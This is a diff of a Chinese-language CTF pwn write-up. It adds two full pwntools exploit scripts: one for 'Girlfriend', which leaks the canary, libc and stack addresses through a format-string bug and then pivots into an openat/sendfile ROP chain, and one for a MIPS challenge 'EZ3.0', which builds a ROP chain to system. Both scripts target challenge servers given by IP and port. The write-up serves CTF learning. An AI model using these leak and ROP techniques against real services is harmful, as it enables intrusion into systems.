@@ -1,4 +1,5 @@
 # Ret2libc's Revenge
+
 ret2libc的题目，但开启了setvbuf(stdout, 0, 0, 0)导致需要将输出缓冲区填满才能有输出
 
 Exp:
@@ -84,7 +85,179 @@ p.sendline(payload)
 p.interactive()
 ```
 
-# girlfriend
+# Girlfriend
 
+综合类型的题目，可以用格式化字符串漏洞泄漏出栈地址，libc地址和code段基址。
+
+题目没给libc版本，也没有gadgets，也不能修改got表，本来以为要用非栈上格式化字符串漏洞去做，后来师傅说去靶机上找到libc版本是2.35，就可以构造ORW了。
+
+```Python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+ip, port = "47.94.172.18:22711".split(":")
+elf_path = './girlfriend'
+libc_path = "./libc.so.6"
+local = False
+debug = True
+debugger = '''
+    b main
+'''
+if local:
+    p = process(elf_path)
+    if debug:
+        gdb.attach(p, debugger)
+else:
+    p = remote(ip, port)
+
+def choose(idx):
+    p.sendlineafter(b'Choice:\n', str(idx).encode())
+
+def Reply(name):
+    choose(3)
+    p.sendafter(b'first\n', name)
+
+def Buyflower():
+    choose(2)
+    p.sendlineafter(b'Y/N\n', b'Y')
+
+def girlfriend(say):
+    choose(1)
+    p.sendlineafter(b'her?\n', say)
+
+elf = ELF(elf_path)
+libc = ELF(libc_path)
+printf_plt = elf.plt['printf']
+system_plt = 0x103f88
+setvbuf_plt = 0x103fb0
+leave_ret = 0x101676
+
+payload = b'a' * 0x17
+girlfriend(payload)
+p.recvuntil(b'a\n')
+code_base = u64(p.recv(6) + b'\x00\x00') - 0x1015c7
+log.success('code_base: ' + hex(code_base))
+flag = code_base + 0x1021ef
+
+payload = b'-%15$p-%37$p-'.ljust(0x30, b'a')
+payload += p64(0x100)
+Reply(payload)
+p.recvuntil(b'name:\n')
+recv = p.recv().split(b'-')
+canary = int(recv[1], 16)
+_rtld_global = int(recv[2], 16) - 128
+log.success('canary: ' + hex(canary))
+libc_base = _rtld_global - libc.sym['__libc_start_main']
+pop_rdi = libc_base + 0x2a3e5
+pop_r12 = libc_base + 0x35731
+pop_rbx = libc_base + 0x35dd1
+pop_rsi = libc_base + 0x2be51
+pop_rdx_r12 = libc_base + 0x11f2e7
+xor_r10_mov_eax_r10 = libc_base + 0x1498f8
+system_addr = libc_base + libc.sym['system']
+read_addr = libc_base + libc.sym['read']
+openat_addr = libc_base + libc.sym['openat']
+write_addr = libc_base + libc.sym['write']
+mmap_addr = libc_base + libc.sym['mmap']
+sendfile_addr = libc_base + libc.sym['sendfile']
+mprotect_addr = libc_base + libc.sym['mprotect']
+log.success('libc_base: ' + hex(libc_base))
+log.success('pop_rdi: ' + hex(pop_rdi))
+
+payload = b'a' * (0x28 - 0x1)
+girlfriend(payload)
+p.recvuntil(b'a\n')
+stack = u64(p.recv(6) + b'\x00\x00') - 0x20
+log.success('stack: ' + hex(stack))
+
+payload = b'./flag'.ljust(0x30, b'a')
+payload += p64(0x100)
+Reply(payload)
+gadgets = [0xef4ce]
+
+payload = flat([
+    code_base + 0x104060,
+    code_base + 0x101749,
+    code_base + 0x104060,
+    pop_rdx_r12, 0, b'./flag\x00\x00',
+    code_base + leave_ret,
+    canary,
+    stack - 0x40,
+    code_base + leave_ret,
+])
+choose(1)
+p.sendafter(b'her?\n', payload)
+
+payload = flat([
+    code_base + 0x104060 + 0x40,
+    # 构造openat
+    pop_rdi, -100,
+    pop_rsi, stack - 0x18,
+    pop_rdx_r12, 0, 0,
+    xor_r10_mov_eax_r10,
+    openat_addr,
+    # 构造sendfile
+    pop_rdi, 1,
+    pop_rsi, 3,
+    pop_rdx_r12, 0, 0,
+    sendfile_addr
+])
+pause()
+p.send(payload)
+
+p.interactive()
+```
 
 # EZ3.0
+
+第一次遇见MIPS架构的题目，后面再写专门的知识点。
+
+题目很简单，有`system`函数，有`/bin/cat falg.txt`，只需要找到`gadgets`来赋值即可
+![[Pasted image 20250406204722.png]]
+很阴的是这个 `gadgets` 我的`ghidra`最开始还没显示，结果找了半天找不到合适的gadgets，后面问了组里的师傅才知道，结果`disasmble`一下又出来了
+圈中部分即是`gadgets`，`a0`存放`/bin/cat`的地址，然后`t9`跳转`system`即可
+
+```Python
+from pwn import *
+
+context(arch='mips', endian='little', log_level='debug')
+ip, port = "47.94.204.178:37016".split(":")
+elf_path = './EZ3'
+local = False
+debug = False
+debugger = '''
+    b main
+'''
+if local:
+    p = process(["qemu-mipsel", "-g", "1234", "-L", "/usr/mipsel-linux-gnu/", elf_path])
+    if debug:
+        gdb.attach(p, gdbscript='''
+            target remote localhost:1234
+            b *0x400830
+            c
+        ''')
+
+else:
+    p = remote(ip, port)
+
+elf = ELF(elf_path)
+bss = elf.bss()
+system = elf.sym['system']
+read = elf.sym['read']
+binls = 0x400c88
+bincat = 0x411010
+backdoor = 0x4009c8
+ret = 0x400a14
+
+payload = b'/bin/sh\x00'.ljust(0x24, b'a') + p32(0x400ab0) + b'a' * 0x4 * 7 + p32(0x0) + p32(0x1) + p32(0x1) + p32(bincat) + p32(0x0) * 2 + p32(0x400aa4)
+payload = flat([
+    b'a' * 0x24,
+    p32(0x400a1c),
+    p32(0),
+    p32(system),
+    p32(bincat)
+])
+p.sendlineafter(b'> ', payload)
+
+p.interactive()
+```
